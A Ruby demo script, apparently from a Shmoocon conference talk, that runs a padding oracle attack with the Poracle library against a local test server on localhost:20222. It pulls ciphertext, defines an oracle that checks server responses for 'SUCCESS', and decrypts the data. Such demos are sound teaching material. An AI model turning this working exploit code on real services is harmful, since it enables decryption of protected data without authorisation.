##
# PoracleDemo.rb
# Created: February 7, 2013
# By: Ron Bowes
#
# A padding oracle attack implemented for Shmoocon
##
#
require 'httparty'
require './poracle/Poracle'

class PaddingOracleShmoocon
  attr_reader :iv, :data, :blocksize

  NAME = "PaddingOracleShmoocon(tm)"

  def initialize()
    @data = HTTParty.get("http://localhost:20222/paddingoracle").parsed_response
    @data = @data.gsub(/.*\[\[\[/m, '')
    @data = @data.gsub(/\]\]\].*/m, '')
    @data = [@data].pack("H*")
    @iv = nil
    @blocksize = 16
  end

  def attempt_decrypt(data)
    result = HTTParty.get("http://localhost:20222/paddingoracle?data=#{data.unpack("H*").pop}")

    return result.parsed_response =~ /SUCCESS/
  end

  def character_set()
    # Return the perfectly optimal string, as a demonstration
    return ' earnisoctldpukhmf,gSywb0.vWD21'.chars.to_a
  end
end

# Attempt a remote check
puts("Starting remote test (this requires RemoteTestServer.rb to be running on localhost:20222)")
begin
  mod = PaddingOracleShmoocon.new
  puts Poracle.decrypt(mod, mod.data, mod.iv, true)
rescue Errno::ECONNREFUSED => e
  puts(e.class)
  puts("Couldn't connect to remote server: #{e}")
end
